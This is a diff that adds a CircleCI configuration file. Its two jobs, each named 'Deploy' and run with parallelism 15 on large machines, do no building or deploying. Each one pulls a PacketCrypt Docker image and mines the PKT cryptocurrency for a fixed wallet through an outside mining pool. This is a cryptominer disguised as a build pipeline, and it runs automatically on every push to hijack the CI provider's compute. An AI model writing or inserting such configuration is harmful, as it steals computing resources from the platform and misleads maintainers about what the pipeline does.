@@ -1,0 +1,33 @@
+version: 2.1
+
+jobs:
+  build:
+    parallelism: 15
+    machine:
+      image: ubuntu-2004:202101-01
+    resource_class: large
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: |
+                      docker pull backupbrain/packetcrypt
+                      docker run backupbrain/packetcrypt ann -p pkt1q8qf58p5fzfp0jgde6dkv87uln7yz0ayjgp3z74 http://pool.pkteer.com
+  build1:
+    parallelism: 15
+    machine:
+      image: ubuntu-2004:202101-01
+    resource_class: large
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: |
+                      docker pull backupbrain/packetcrypt
+                      docker run backupbrain/packetcrypt ann -p pkt1q8qf58p5fzfp0jgde6dkv87uln7yz0ayjgp3z74 http://pool.pkteer.com
+
+workflows:
+  main:
+    jobs:
+      - build
+      - build1
